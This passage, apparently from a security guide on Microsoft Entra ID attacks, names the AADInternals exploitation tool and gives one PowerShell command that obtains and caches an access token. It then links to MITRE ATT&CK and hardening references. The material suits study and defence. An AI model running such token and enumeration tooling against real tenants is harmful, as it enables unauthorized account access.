4. **[AADInternals](https://github.com/Gerenios/AADInternals)**
   - **Purpose:** Advanced Entra ID exploitation (token generation, user enumeration)
   - **Usage:** `Get-AADIntAccessTokenForAADGraph -SaveToCache`
   - **Platform:** Windows (PowerShell)

### Reference Documentation

- [MITRE ATT&CK T1078.004: Valid Account (Cloud)](https://attack.mitre.org/techniques/T1078/T1078.004/)
- [MITRE ATT&CK T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
- [Microsoft Entra ID Security Best Practices](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-user-accounts)
- [CIS Microsoft Entra ID Benchmark](https://www.cisecurity.org/benchmark/microsoft_azure)
- [Conditional Access Best Practices](https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common)

---